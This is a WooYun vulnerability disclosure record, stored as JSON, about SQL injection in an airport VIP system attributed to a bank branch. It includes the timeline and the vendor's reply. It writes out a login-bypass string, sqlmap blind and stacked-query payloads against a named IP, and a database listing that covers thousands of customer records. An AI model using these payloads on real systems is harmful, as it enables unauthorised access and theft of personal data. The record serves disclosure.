{"id": 73676, "wybug_id": "wooyun-2015-0161114", "wybug_title": "平安银行杭州分行某系统SQL注入(dba权限\\数千VIP客户信息泄露)", "wybug_corp": "平安银行", "wybug_author": "默之", "wybug_date": "2015-12-13 23:58", "wybug_open_date": "2016-01-28 17:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["管理后台对外", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向公众公开  简要描述： 都是坑人的队友 详细说明：  机场VIP服务系统\nhttp://122.224.232.58/\npassword处存在注入，'or'1'='1登入后台\n\n4300位VIP客户信息，包括身份证信息和VIP卡号以及部分电话号码\n\n还有部分老外信息\n\n   漏洞证明：  \nParameter: #1* ((custom) POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwULLTEwNTcyMzk5NDlkZF/LZvLAQjtS8uqCBUouxYjTs1cG/kFoai8qmM7rpj/g&__EVENTVALIDATION=/wEdAARcNpmthiToDsE3afuF/NB1LrflLbaTF4+IO/P7y1Lo5aM0Xx7nPFLadUCblB4PktOinihG6d/Xh3PZm3b5AoMQrdcB3FsoRQ7zEDa3y4b8b6lUEIiLRoGPb1qRWoaAtws=&uid=admin&upwd='or'1'='1' AND 2791=2791 AND 'NyPK'='NyPK&btnLogin=LOGIN    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwULLTEwNTcyMzk5NDlkZF/LZvLAQjtS8uqCBUouxYjTs1cG/kFoai8qmM7rpj/g&__EVENTVALIDATION=/wEdAARcNpmthiToDsE3afuF/NB1LrflLbaTF4+IO/P7y1Lo5aM0Xx7nPFLadUCblB4PktOinihG6d/Xh3PZm3b5AoMQrdcB3FsoRQ7zEDa3y4b8b6lUEIiLRoGPb1qRWoaAtws=&uid=admin&upwd='or'1'='1';WAITFOR DELAY '0:0:5'--&btnLogin=LOGIN---[23:35:05] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2012\nDBA权限\n\n数据库信息\navailable databases [7]:[*] AirVIP[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb\n\nDatabase: AirVIP+------------+---------+| Table      | Entries |+------------+---------+| dbo.VIP消费流水表    | 4686    || dbo.VIP客户信息    | 4305    || dbo.module | 8       || dbo.users  | 4       |+------------+---------+\n   修复方案：  过滤参数，再仔细检查下其他的参数，应该还有   版权声明：转载请注明来源 默之@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2015-12-18 08:33 厂商回复： 员工个人私设站点，非官方行为 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}